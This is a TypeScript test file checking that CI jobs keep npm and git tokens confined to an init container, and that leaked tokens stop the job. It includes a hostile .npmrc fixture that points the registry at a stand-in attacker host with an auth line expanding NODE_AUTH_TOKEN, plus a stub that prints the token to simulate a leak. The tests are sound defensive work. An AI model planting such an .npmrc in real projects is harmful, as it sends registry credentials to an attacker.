// T-401: the job-run and gate Jobs give their credentials (the npm token, the git token) to the init container `fetch` alone. It clones and
// runs `npm ci --ignore-scripts`; the install scripts and the command run in the main container, which has no credential in its
// environment, git config or files. Checked on the manifests and by running the containers' own scripts in order here, with credentials
// made at runtime (never a literal) and a fake npm that records, for each call, whether a credential was there (never its value).

import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { gzipSync } from 'node:zlib';
import { after, test } from 'node:test';
import { fileURLToPath } from 'node:url';
import { load as yamlLoad } from 'js-yaml';
import { runPod, scriptPart } from './jobRunTestkit.js';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '../../../..');
const JOB_RUN = join(REPO, 'deploy/k3s-build/job-run.yaml');
const GATE = join(REPO, 'deploy/k3s-build/gate-job.yaml');
const CRED_NAMES = ['NODE_AUTH_TOKEN', 'GIT_TOKEN', 'GIT_USER'];
const roots: string[] = [];
after(() => roots.forEach((r) => rmSync(r, { recursive: true, force: true })));
const hex = (n: number) => randomBytes(n).toString('hex');

type Env = { name: string; value?: string; valueFrom?: { secretKeyRef?: { name: string; key: string } } };
type C = { name: string; env?: Env[]; envFrom?: unknown[]; volumeMounts?: { name: string }[]; args?: string[] };
type Pod = { initContainers?: C[]; containers: C[]; volumes?: { name: string; secret?: unknown }[] };

function podOf(file: string): Pod {
  const text = readFileSync(file, 'utf8').replace(/__MEMORY__/g, '4Gi').replace(/__TMP_SIZE__/g, '2Gi').replace(/__[A-Z_]+__/g, 'x');
  return (yamlLoad(text) as { spec: { template: { spec: Pod } } }).spec.template.spec;
}

test('T-401 manifests: the main container of job-run and gate has no Secret; the fetch init container has it, and its HOME alone', () => {
  for (const [file, main] of [[JOB_RUN, 'run'], [GATE, 'gate']] as const) {
    const pod = podOf(file);
    const secretVolumes = (pod.volumes ?? []).filter((v) => v.secret).map((v) => v.name);
    for (const c of pod.containers) {
      assert.equal(c.name, main);
      assert.deepEqual((c.env ?? []).filter((e) => e.valueFrom?.secretKeyRef).map((e) => e.name), [], `${file}: no secretKeyRef in ${c.name}`);
      assert.deepEqual((c.env ?? []).filter((e) => CRED_NAMES.includes(e.name)).map((e) => e.name), [], `${file}: no credential name in ${c.name}`);
      assert.equal(c.envFrom, undefined, `${file}: no envFrom in ${c.name}`);
      const mounts = (c.volumeMounts ?? []).map((m) => m.name);
      assert.ok(!mounts.includes('fetch-home'), `${file}: the fetch HOME is not mounted in ${c.name}`);
      assert.deepEqual(mounts.filter((m) => secretVolumes.includes(m)), [], `${file}: no Secret volume in ${c.name}`);
    }
    const inits = pod.initContainers ?? [];
    assert.deepEqual(inits.map((c) => c.name), ['fetch'], `${file}: one init container, fetch`);
    const fetch = inits[0] as C;
    const refs = (fetch.env ?? []).filter((e) => e.valueFrom?.secretKeyRef).map((e) => e.name);
    assert.ok(refs.includes('NODE_AUTH_TOKEN'), `${file}: fetch has the npm token`);
    assert.ok((fetch.volumeMounts ?? []).some((m) => m.name === 'fetch-home'), `${file}: fetch has its own HOME`);
    assert.ok((fetch.volumeMounts ?? []).some((m) => m.name === 'tmp'), `${file}: fetch shares /tmp`);
  }
});

/** A local repository served as the Job's remote, a fake npm that records each call and whether a credential was there. */
function world() {
  const root = mkdtempSync(join(tmpdir(), 'cp-t401-'));
  roots.push(root);
  const env0 = { PATH: process.env.PATH, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' };
  const git = (args: string[], cwd: string) => {
    const r = spawnSync('git', ['-c', 'user.email=t@t', '-c', 'user.name=t', ...args], { cwd, encoding: 'utf8', env: env0 });
    assert.equal(r.status, 0, r.stderr);
    return r.stdout.trim();
  };
  const src = join(root, 'src');
  mkdirSync(src);
  git(['init', '-q', '-b', 'main'], src);
  writeFileSync(join(src, 'package.json'), JSON.stringify({ name: 'p', version: '1.0.0', scripts: { postinstall: 'x', prepare: 'y', test: 'z' } }));
  writeFileSync(join(src, 'package-lock.json'), '{"v":1}');
  git(['add', '.'], src); git(['commit', '-qm', 'one'], src);
  const one = git(['rev-parse', 'HEAD'], src);
  const bare = join(root, 'remote.git');
  const publish = () => { rmSync(bare, { recursive: true, force: true }); git(['clone', '-q', '--bare', src, bare], root); };
  publish();
  const bin = join(root, 'bin');
  mkdirSync(bin);
  const calls = join(root, 'calls');
  const creds = { NODE_AUTH_TOKEN: `fx${hex(18)}`, GIT_TOKEN: `gt${hex(18)}`, GIT_USER: 'x-access-token' };
  const tokfile = join(root, 'tokfile');
  writeFileSync(tokfile, `${creds.NODE_AUTH_TOKEN}\n`);
  // "set"/"" for each credential name, never the value; the git helpers and the user npmrc as this process would find them; `uc` = the
  // --userconfig file holds the npm token; `proj` = a .npmrc of the commit is in the folder npm runs in (what a real npm would read).
  const probe = 'tok=${NODE_AUTH_TOKEN:+set} gtok=${GIT_TOKEN:+set} guser=${GIT_USER:+set} helper=$(git config --global --get-regexp "^credential" 2>/dev/null | wc -l) npmrc=$([ -e "$HOME/.npmrc" ] && echo yes || echo no) uc=$([ -n "${uc:-}" ] && grep -qF -f "' + tokfile + '" "$uc" 2>/dev/null && echo set) proj=$([ -e .npmrc ] && echo seen)';
  // The fake npm. STUB_LEAK: prints the token to stderr (as a failing npm may). STUB_MISS: fails the offline install (a cache miss).
  writeFileSync(join(bin, 'npm'), `#!/bin/bash
uc=; prev=
for a in "$@"; do [ "$prev" = --userconfig ] && uc=$a; prev=$a; done
[ -z "\${STUB_LEAK:-}" ] || cat "${tokfile}" >&2
case "$*" in *--prefer-offline*) if [ -n "\${STUB_MISS:-}" ]; then echo "npm ERR! code ENOTCACHED" >&2; exit 1; fi ;; esac
echo "npm $* ${probe}" >> "${calls}"
mkdir -p node_modules
`);
  chmodSync(join(bin, 'npm'), 0o755);
  // A grep that fails (exit 2, a message) for the credential scan (-rlF) and is the real grep otherwise: STUB_GREP=1 selects it.
  const realGrep = spawnSync('sh', ['-c', 'command -v grep'], { encoding: 'utf8' }).stdout.trim();
  writeFileSync(join(bin, 'grep'), `#!/bin/bash\nif [ -n "\${STUB_GREP:-}" ] && [ "$1" = -rlF ]; then echo "grep: scan stub failed" >&2; exit 2; fi\nexec ${realGrep} "$@"\n`);
  chmodSync(join(bin, 'grep'), 0o755);
  // Event's URL (the npmrc and the scoped helper are written for it alone, T-491), served from the local repository.
  const url = 'https://github.com/isnanme/event.git';
  const pod = (over: Record<string, string> = {}, c: Record<string, string> = creds) => {
    rmSync(calls, { force: true });
    const jr = join(root, `jr-${hex(3)}`);
    const r = runPod(JOB_RUN, { PATH: `${bin}:${process.env.PATH}`, JR_ROOT: jr, JR_REPO_URL: url, JR_REF: 'main', JR_ALSO: '', JR_STEPS: 'npm-ci',
      JR_ARTIFACTS: '', JR_ARTIFACT_MAX: '1', JR_CMD: Buffer.from(`echo "cmd ${probe}" >> "${calls}"`).toString('base64'), GIT_CONFIG_NOSYSTEM: '1',
      GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: `url.file://${bare}.insteadOf`, GIT_CONFIG_VALUE_0: url, ...over }, c);
    return { r, jr, lines: existsSync(calls) ? readFileSync(calls, 'utf8').trim().split('\n') : [] };
  };
  return { root, src, git, one, publish, creds, pod };
}

/** A recorded npm call without its --userconfig path (a random scratch folder). */
const noUc = (l: string) => l.replace(/ --userconfig \S+/, '');

const noValue = (text: string, creds: Record<string, string>) => {
  for (const [k, v] of Object.entries(creds)) if (v.length >= 8) assert.ok(!text.includes(v), `the value of ${k} is not in the output`);
};

test('T-401 order: clone and npm ci --ignore-scripts with the credentials, then the install scripts and the command with none', () => {
  const w = world();
  const { r, lines } = w.pod();
  assert.equal(r.status, 0, r.stdout + r.stderr);
  noValue(r.stdout + r.stderr, w.creds);
  const clean = 'tok= gtok= guser= helper=0 npmrc=no uc= proj=';
  assert.deepEqual(lines.map(noUc), [
    // The npm token is in the trusted userconfig file only (uc=set), never in the environment (tok=).
    'npm ci --ignore-scripts --no-audit --no-fund --loglevel=error tok= gtok=set guser=set helper=2 npmrc=yes uc=set proj=',
    `npm rebuild --no-audit --no-fund --loglevel=error ${clean}`,
    `npm run --ignore-scripts --loglevel=error postinstall ${clean}`,
    `npm run --ignore-scripts --loglevel=error prepare ${clean}`,
    `cmd ${clean}`,
  ]);
  assert.match(r.stdout, /=== JOB-RUN checked out event at [0-9a-f]+ in \d+s\n[\s\S]*=== JOB-RUN credentials: used for the fetch only; none is in the files the command gets/);
  assert.match(r.stdout, /=== JOB-RUN EXIT 0\n$/);
});

test('T-401 the fetch check: a credential value in a file the command would get stops the Job (code 3), naming the file, never the value', () => {
  const w = world();
  writeFileSync(join(w.src, 'leak.txt'), `token ${w.creds.GIT_TOKEN}\n`);
  w.git(['add', '.'], w.src); w.git(['commit', '-qm', 'leak'], w.src); w.publish();
  const { r, lines } = w.pod();
  assert.equal(r.status, 3, r.stdout + r.stderr);
  noValue(r.stdout + r.stderr, w.creds);
  assert.match(r.stdout, /\/w\/event\/leak\.txt\n[\s\S]*the credential GIT_TOKEN is in the files above, which the command would see: stopping\n=== JOB-RUN EXIT 3\n$/);
  assert.ok(!lines.some((l) => l.startsWith('cmd ') || l.startsWith('npm rebuild')), 'nothing of the repository ran');
});

test('T-401 --against with another lockfile: fetched and cached by fetch; the run container installs offline, without a credential', () => {
  const w = world();
  writeFileSync(join(w.src, 'package-lock.json'), '{"v":2}');
  w.git(['add', '.'], w.src); w.git(['commit', '-qm', 'two'], w.src); w.publish();
  const { r, lines } = w.pod({ JR_AGAINST: w.one });
  assert.equal(r.status, 1, r.stdout + r.stderr); // the command passes on both: no proof, which is beside the point here
  assert.match(r.stdout, /lockfile differs on [0-9a-f]{40}: npm ci again \(offline, from the cache\)/);
  const withCred = lines.filter((l) => / uc=set /.test(l));
  assert.deepEqual(withCred.map((l) => noUc(l).split(' tok=')[0]), ['npm ci --ignore-scripts --no-audit --no-fund --loglevel=error', 'npm ci --ignore-scripts --no-audit --no-fund --loglevel=error'],
    'fetch: the ref and the other lockfile (into the cache), both without scripts');
  // The two fetch lines are the same text: what follows the LAST one is the run container's.
  const last = lines.slice(lines.lastIndexOf(withCred[1] as string) + 1);
  assert.ok(last.length > 0 && last.every((l) => l.endsWith('tok= gtok= guser= helper=0 npmrc=no uc= proj=')), last.join('\n'));
  assert.ok(last.includes('npm ci --ignore-scripts --prefer-offline --no-audit --no-fund --loglevel=error tok= gtok= guser= helper=0 npmrc=no uc= proj='));
  noValue(r.stdout + r.stderr, w.creds);
});

test('T-401 cache miss: the offline install of the other ref fails when a package is not in npm\'s cache: red with a message, never green', () => {
  const w = world();
  writeFileSync(join(w.src, 'package-lock.json'), '{"v":2}');
  w.git(['add', '.'], w.src); w.git(['commit', '-qm', 'two'], w.src); w.publish();
  const { r } = w.pod({ JR_AGAINST: w.one, STUB_MISS: '1' });
  assert.notEqual(r.status, 0, r.stdout + r.stderr);
  assert.match(r.stdout, /npm ci failed on [0-9a-f]{40} \(rc=1\): this container has no credential, so a package missing from npm's cache .* is red, never skipped\n=== JOB-RUN EXIT 1\n$/);
  assert.ok(!/PROOF: passes/.test(r.stdout));
});

test('T-401 a .npmrc of the commit under test never sees the npm token: it is put aside for npm ci (fetch) and is back for the run container', () => {
  const w = world();
  // Another registry, with the auth line that expands the variable: the way a hostile commit would ask for the token.
  writeFileSync(join(w.src, '.npmrc'), ['registry=https://evil.invalid/', '//evil.invalid/:_authToken=${NODE_AUTH_TOKEN}', ''].join('\n'));
  w.git(['add', '.'], w.src); w.git(['commit', '-qm', 'npmrc'], w.src); w.publish();
  const { r, jr, lines } = w.pod();
  assert.equal(r.status, 0, r.stdout + r.stderr);
  const fetchCi = lines.find((l) => / uc=set /.test(l)) as string;
  assert.ok(fetchCi, lines.join('\n'));
  assert.match(fetchCi, / tok= .* uc=set proj=$/, 'at the fetch npm: no variable, the commit\'s .npmrc not in its folder, the token in the userconfig');
  assert.ok(existsSync(join(jr, 'w/event/.npmrc')) && !existsSync(join(jr, 'w/event/.npmrc.t401')), 'the commit\'s .npmrc is back');
  assert.ok(lines.slice(1).every((l) => / tok= gtok= guser= helper=0 npmrc=no uc= proj=seen$/.test(l)), 'the run container sees it, with no token');
  noValue(r.stdout + r.stderr, w.creds);
});

test('T-401 exit 3 prints no value: a token in fetch.log itself (a failing npm printed it) is not printed, only the verdict and the file names', () => {
  const w = world();
  const { r, jr } = w.pod({ STUB_LEAK: '1' });
  assert.equal(r.status, 3, r.stdout + r.stderr);
  noValue(r.stdout + r.stderr, w.creds);
  assert.match(r.stdout, /\/fetch\.log\n[\s\S]*the credential NODE_AUTH_TOKEN is in the files above, which the command would see: stopping\n=== JOB-RUN EXIT 3\n$/);
  assert.ok(!readFileSync(join(jr, 'fetch.log'), 'utf8').includes(w.creds.NODE_AUTH_TOKEN));
  assert.ok(!existsSync(join(jr, 'w')), 'the tree is deleted');
});

test('T-401 the scan fails closed: a grep that fails (exit 2) is red, code 3, and the unchecked files are deleted', () => {
  const w = world();
  const { r, jr, lines } = w.pod({ STUB_GREP: '1' });
  assert.equal(r.status, 3, r.stdout + r.stderr);
  assert.match(r.stdout, /scan messages:\ngrep: scan stub failed\n[\s\S]*the credential scan failed, so the files above could not be checked \(they are deleted\): stopping\n=== JOB-RUN EXIT 3\n$/);
  assert.ok(!/credentials: used for the fetch only/.test(r.stdout), 'never reported clean');
  assert.ok(!existsSync(join(jr, 'w')) && !lines.some((l) => l.startsWith('cmd ')), 'nothing was left or ran');
});

test('T-401 a gzipped copy of a credential is deleted and the Job is red; a gzip without one is left alone', () => {
  const w = world();
  writeFileSync(join(w.src, 'fine.txt.gz'), gzipSync('nothing here\n'));
  w.git(['add', '.'], w.src); w.git(['commit', '-qm', 'gz fine'], w.src); w.publish();
  const ok = w.pod();
  assert.equal(ok.r.status, 0, ok.r.stdout + ok.r.stderr);
  assert.ok(existsSync(join(ok.jr, 'w/event/fine.txt.gz')));
  writeFileSync(join(w.src, 'leak.txt.gz'), gzipSync(`token ${w.creds.GIT_TOKEN}\n`));
  w.git(['add', '.'], w.src); w.git(['commit', '-qm', 'gz leak'], w.src); w.publish();
  const { r, jr } = w.pod();
  assert.equal(r.status, 3, r.stdout + r.stderr);
  noValue(r.stdout + r.stderr, w.creds);
  assert.match(r.stdout, /\/w\/event\/leak\.txt\.gz\n[\s\S]*the credential GIT_TOKEN is in the files above/);
  assert.ok(!existsSync(join(jr, 'w/event/leak.txt.gz')));
});

test('T-401 the repository\'s own .npmrc form (an auth line with the variable) loads in a real npm when the variable is defined and empty (what the run and gate containers set)', { skip: spawnSync('npm', ['--version']).status !== 0 }, () => {
  const dir = mkdtempSync(join(tmpdir(), 'cp-t401-npm-'));
  roots.push(dir);
  writeFileSync(join(dir, '.npmrc'), readFileSync(join(REPO, '.npmrc')));
  writeFileSync(join(dir, 'package.json'), '{"name":"p","version":"1.0.0"}');
  const base = { PATH: process.env.PATH, HOME: dir, npm_config_update_notifier: 'false' };
  const empty = spawnSync('npm', ['config', 'get', '@isnanme:registry'], { cwd: dir, encoding: 'utf8', env: { ...base, NODE_AUTH_TOKEN: '' } });
  assert.equal(empty.status, 0, empty.stderr);
  assert.equal(empty.stdout.trim(), 'https://npm.pkg.github.com');
});

test('T-401 gate: the fetch container clones and fills npm\'s cache without scripts, removes its copy and finds no token in /tmp', () => {
  const w = world();
  const root = join(w.root, 'gate-tmp');
  const bin = join(w.root, 'bin');
  const tok = w.creds.NODE_AUTH_TOKEN;
  const run = (commit: string, extra: Record<string, string> = {}) => {
    rmSync(root, { recursive: true, force: true }); mkdirSync(root); rmSync(join(w.root, 'calls'), { force: true });
    const f = spawnSync('bash', ['-c', scriptPart(GATE, '# GATE-FETCH BEGIN', '# GATE-FETCH END')], { encoding: 'utf8', env: {
      PATH: `${bin}:${process.env.PATH}`, GATE_ROOT: root, GATE_FETCH_HOME: join(w.root, 'gate-home'), GATE_REPO_URL: `file://${join(w.root, 'remote.git')}`,
      COMMIT: commit, GIT_CONFIG_NOSYSTEM: '1', NODE_AUTH_TOKEN: tok, ...extra } });
    assert.equal(f.status, 0, f.stdout + f.stderr);
    return { rc: readFileSync(join(root, 'fetch.rc'), 'utf8').trim(), log: readFileSync(join(root, 'fetch.log'), 'utf8') };
  };
  const ok = run(w.one);
  assert.equal(ok.rc, '0', ok.log);
  assert.match(ok.log, /credentials: used for npm's cache only; none is in the files the gate gets/);
  assert.ok(existsSync(join(root, 'src/package.json')) && !existsSync(join(root, 'warm')), 'the commit in /tmp/src; the throwaway copy gone');
  assert.match(readFileSync(join(w.root, 'calls'), 'utf8'), /^npm ci --ignore-scripts --no-audit --no-fund --loglevel=error --userconfig \S+ tok= .* uc=set proj=$/m, 'the token in the userconfig only');
  assert.ok(!ok.log.includes(tok));
  const missing = run('0'.repeat(40));
  assert.equal(missing.rc, '1');
  assert.match(missing.log, /GATE-VERDICT: red: 0{40} is not on GitHub \(push it first\)/);

  // A token in fetch.log itself (npm printed it): the log the gate container prints holds the verdict and file names only (rc 3).
  const leak = run(w.one, { STUB_LEAK: '1' });
  assert.equal(leak.rc, '3');
  assert.ok(!leak.log.includes(tok), 'the value is not in the log the gate container prints');
  assert.match(leak.log, /\/fetch\.log\nGATE-VERDICT: red: the token is in the files above, which the gate would see\n$/);
  assert.ok(!existsSync(join(root, 'src')), 'the tree is deleted');

  // The scan fails closed.
  const broken = run(w.one, { STUB_GREP: '1' });
  assert.equal(broken.rc, '3');
  assert.match(broken.log, /scan messages:\ngrep: scan stub failed\nGATE-VERDICT: red: the credential scan failed, so the files above could not be checked \(they are deleted\); nothing ran\n$/);
  assert.ok(!/credentials: used for npm/.test(broken.log) && !existsSync(join(root, 'src')));

  // A commit's own .npmrc (another registry, the variable in an auth line) never sees the token: it is left out of the copy npm ci runs in.
  writeFileSync(join(w.src, '.npmrc'), ['registry=https://evil.invalid/', '//evil.invalid/:_authToken=${NODE_AUTH_TOKEN}', ''].join('\n'));
  w.git(['add', '.'], w.src); w.git(['commit', '-qm', 'npmrc'], w.src); w.publish();
  const hostile = run(w.git(['rev-parse', 'HEAD'], w.src));
  assert.equal(hostile.rc, '0', hostile.log);
  assert.match(readFileSync(join(w.root, 'calls'), 'utf8'), / tok= .* uc=set proj=$/m);
  assert.ok(existsSync(join(root, 'src/.npmrc')), 'the checkout the gate runs on keeps its .npmrc');
});

test('T-401 gate cache miss: npm ci failing in the gate container (a package not in the cache) is a red verdict, never green', () => {
  const dir = mkdtempSync(join(tmpdir(), 'cp-t401-v-'));
  roots.push(dir);
  writeFileSync(join(dir, 'SUMMARY.txt'), 'npm-ci rc=1 12s\ntypecheck rc=0 1s\nweb-build rc=0 1s\nserver-suite rc=0 1s\n');
  const v = spawnSync('bash', [join(REPO, 'scripts/gate-verdict.sh'), 'logs', dir, 'typecheck,web-build,server-suite'], { encoding: 'utf8' });
  assert.equal(v.status, 1);
  assert.match(v.stdout, /^GATE-VERDICT: red: npm-ci failed\n$/);
  // The gate container says why, in words, before the end of that log.
  assert.match(readFileSync(GATE, 'utf8'), /echo "=== npm ci failed in the gate container: it has no credential and installs from the cache.*is red, never skipped"/);
});
